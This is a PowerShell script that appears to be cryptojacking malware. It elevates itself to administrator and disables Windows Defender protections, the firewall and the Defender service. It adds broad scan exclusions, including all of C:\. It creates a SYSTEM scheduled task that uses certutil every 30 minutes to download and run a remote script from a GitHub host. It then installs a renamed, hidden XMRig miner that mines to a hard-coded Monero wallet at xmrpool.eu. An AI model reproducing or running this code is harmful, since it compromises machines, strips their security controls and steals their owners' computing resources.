# Function to check if running as admin
function Test-Admin {
    return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# If not running as admin, re-launch the script with elevated privileges
if (-not (Test-Admin)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# Disable various Windows Defender features
$preferences = @(
    "DisableBehaviorMonitoring", "DisableArchiveScanning", "DisableDatagramProcessing", 
    "DisableDnsOverTcpParsing", "DisableDnsParsing", "DisableEmailScanning", 
    "DisableFtpParsing", "DisableGradualRelease", "DisableHttpParsing", 
    "DisableInboundConnectionFiltering", "DisableIOAVProtection", 
    "DisableNetworkProtectionPerfTelemetry", "DisablePrivacyMode", "DisableRdpParsing", 
    "DisableRealtimeMonitoring", "DisableRemovableDriveScanning", "DisableRestorePoint", 
    "DisableScanningMappedNetworkDrivesForFullScan", "DisableScanningNetworkFiles", 
    "DisableScriptScanning", "DisableSshParsing", "DisableTDTFeature", 
    "DisableTlsParsing", "DisableBlockAtFirstSeen", "DisableIntrusionPreventionSystem"
)
foreach ($pref in $preferences) {
    Set-MpPreference -$pref $True -ErrorAction SilentlyContinue
}

# Set threat actions to Allow
$threatActions = @("LowThreatDefaultAction", "ModerateThreatDefaultAction", "HighThreatDefaultAction")
foreach ($action in $threatActions) {
    Set-MpPreference -$action Allow -ErrorAction SilentlyContinue
}

# Disable firewall
netsh advfirewall set all state off

# Stop and disable Windows Defender service
sc stop WinDefend
sc config WinDefend start= disabled

# Create directories
$directories = @("C:\windows\system32\MDSN", "C:\ProgramData\MDSN")
foreach ($dir in $directories) {
    New-Item -ItemType Directory -Force -Path $dir
}

# Set PUA protection
Set-MpPreference -PUAProtection 0

# Add exclusion paths
$exclusionPaths = @('C:\', 'C:\ProgramData', 'C:\windows\system32\MDSN')
foreach ($path in $exclusionPaths) {
    Add-MpPreference -ExclusionPath $path
}
Set-MpPreference -ExclusionProcess 'explorer.exe', 'cmd.exe', 'mm.exe', 'powershell.exe', 'svchost.exe', 'scvhost.exe'

# Disable anti-spyware
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

# Schedule task if not exists
if (-not (schtasks /query /TN "mmWin" > $null 2>&1)) {
    schtasks /create /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /sc minute /mo 30 /tn "mmWin" /tr "cmd.exe /C certutil.exe -urlcache -f https://raw.githubusercontent.com/cyberre124/test/main/atmon.ps1 $env:SystemDrive\Windows\Temp\atmon.ps1 & $env:SystemDrive\Windows\Temp\atmon.ps1"
}

# Check and download xmrig if not exists
$xmrigPath = "$env:SystemDrive\Windows\Temp\WinSVC"
if (Test-Path $xmrigPath) {
    if (-not (Test-Path "$xmrigPath\mm.exe")) {
        Remove-Item -Recurse -Force $xmrigPath
        Remove-Item -Recurse -Force "$env:SystemDrive\Windows\Temp\xmrig-6.21.2"
    }
} else {
    Write-Output "No"
    [Net.ServicePointManager]::SecurityProtocol = 'Tls, Tls11, Tls12, Ssl3'
    Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip' -OutFile "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip"
    Expand-Archive -Force "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip" "$env:SystemDrive\Windows\Temp"
    Rename-Item "$env:SystemDrive\Windows\Temp\xmrig-6.21.2" $xmrigPath
    Rename-Item "$xmrigPath\xmrig.exe" "$xmrigPath\mm.exe"

    if (-not (Test-Path $xmrigPath)) {
        [System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
        $pathToZip = "$env:SystemDrive\Windows\Temp\xmrig-6.21.2-msvc-win64.zip"
        $targetDir = "$env:SystemDrive\Windows\Temp"
        [System.IO.Compression.ZipFile]::ExtractToDirectory($pathToZip, $targetDir)
        Rename-Item "$env:SystemDrive\Windows\Temp\xmrig-6.21.2" $xmrigPath
        Rename-Item "$xmrigPath\xmrig.exe" "$xmrigPath\mm.exe"
    }

    Get-Item $xmrigPath -Force | ForEach-Object { $_.Attributes = $_.Attributes -bor 'Hidden' }
}

# Get system information
$host = (hostname)
$mem = [math]::round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum / 1GB)
$cpu = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors

Write-Output $host
Write-Output $mem
Write-Output $cpu

# Set name and start mm.exe if not running
$name = "$host.$mem`GB.$cpu`CPU"
Write-Output $name

$EXE = "mm.exe"
$process = Get-Process -Name $EXE -ErrorAction SilentlyContinue
if (-not $process) {
    Write-Output "$EXE is Not Running"
    Start-Process -FilePath "$xmrigPath\mm.exe" -ArgumentList "-o xmrpool.eu:9999 -u 41zgTNW4Z9FiTorttLakhJ8HFN77CXeFw1NNMHa48oqPZZFwrEc6JNj3bDaihgdzmuXDcKZeJhRfBAEAcSeT41hs9cvCMNR -k --tls --rig-id $name --randomx-1gb-pages --background"
}
